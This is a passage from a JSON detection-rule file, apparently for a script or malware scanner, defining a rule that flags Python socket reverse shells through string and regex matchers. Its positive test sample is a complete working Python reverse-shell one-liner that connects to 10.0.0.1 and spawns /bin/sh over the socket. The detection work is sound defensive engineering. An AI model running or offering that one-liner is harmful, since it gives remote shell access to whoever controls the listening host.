  {
   "id": "byte-revshell-python-socket",
   "name": "Python socket reverse shell",
   "description": "socket connect followed by os.dup2 of the socket to stdin/out/err and a spawned shell.",
   "tactic": "Execution",
   "technique": "T1059.006",
   "severity": "critical",
   "weight": 65,
   "applies_to": "both",
   "format": "script",
   "strings": [
    {
     "name": "s",
     "type": "ascii",
     "value": "socket.socket"
    },
    {
     "name": "c",
     "type": "ascii",
     "value": ".connect(("
    },
    {
     "name": "d",
     "type": "regex",
     "value": "os\\.dup2\\(\\s*\\w+\\.fileno\\(\\)\\s*,\\s*[012]\\s*\\)",
     "min": 2
    },
    {
     "name": "p",
     "type": "regex",
     "value": "(?:pty\\.spawn|subprocess\\.(?:call|Popen)|os\\.system|os\\.exec\\w+)\\s*\\("
    }
   ],
   "condition": {
    "all": [
     {
      "str": "s"
     },
     {
      "str": "c"
     },
     {
      "str": "d"
     },
     {
      "str": "p"
     }
    ]
   },
   "samples": {
    "positive": [
     {
      "text": "import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")"
     }
    ],
    "negative": [
     {
      "text": "import socket;s=socket.socket();s.connect(('10.0.0.1',80));s.send(b'x')"
     },
     {
      "text": "os.dup2(f.fileno(), 1)"
     }
    ]
   }
  },
  {
   "id": "byte-revshell-perl",
